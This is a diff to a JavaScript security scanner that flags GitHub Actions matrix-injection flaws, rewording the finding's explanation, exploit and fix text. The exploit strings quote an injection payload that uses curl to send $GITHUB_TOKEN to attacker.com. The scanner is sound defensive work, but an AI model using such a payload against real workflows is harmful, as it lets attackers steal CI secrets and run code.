@@ -68,10 +68,10 @@ export function checkMatrixInjection(workflow, rawContent, filename) {
         line:        lineNumber,
         snippet,
         context:     `Job: \`${jobName}\`  ·  Step ${stepIndex + 1}${step.name ? ` (${step.name})` : ''}`,
-        detail:      `The job's \`strategy.matrix\` is populated from attacker-controlled event data (e.g., \`fromJSON(github.event.*)\`). The matrix values are then interpolated via \`\${{ matrix.* }}\` into a \`run:\` step. Because matrix values are substituted before shell execution, the attacker controls arbitrary shell input in that step — this is functionally identical to direct template injection.`,
-        exploit:     `An attacker crafts an event (PR body, issue, comment) containing a matrix value like \`"; curl https://attacker.com/exfil?t=$GITHUB_TOKEN #"\`. When the workflow expands \`\${{ matrix.target }}\` inside the run script, the attacker's payload executes, exfiltrating secrets.`,
-        impact:      'Template Injection via Matrix → Remote Code Execution with Secret Access',
-        remediation: `Never use external event data directly in \`strategy.matrix\`. Validate and allowlist matrix values before use, or avoid \`fromJSON()\` with untrusted input entirely. Pass matrix values through env vars and sanitize:\n\nenv:\n  TARGET: \${{ matrix.target }}\nrun: echo "Building $TARGET"`,
+        detail:      `The job's \`strategy.matrix\` is populated from attacker-controlled event data (e.g. \`fromJSON(github.event.*)\`). The matrix values are then interpolated via \`\${{ matrix.* }}\` into a \`run:\` step. GitHub substitutes matrix values before the shell runs, so the attacker controls shell input directly.`,
+        exploit:     `An attacker crafts a PR body or issue containing a matrix value like \`"; curl https://attacker.com/?t=$GITHUB_TOKEN #"\`. When the workflow expands \`\${{ matrix.target }}\` in the run step, the payload executes and exfiltrates secrets.`,
+        impact:      'Matrix Injection → Remote Code Execution with Secret Access',
+        remediation: `Do not use external event data in \`strategy.matrix\`. Pass matrix values through env vars so the shell does not interpret them as code:\n\nenv:\n  TARGET: \${{ matrix.target }}\nrun: echo "Building $TARGET"`,
         cvss:        { score: 8.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N', cwe: 'CWE-94' },
       });
     }
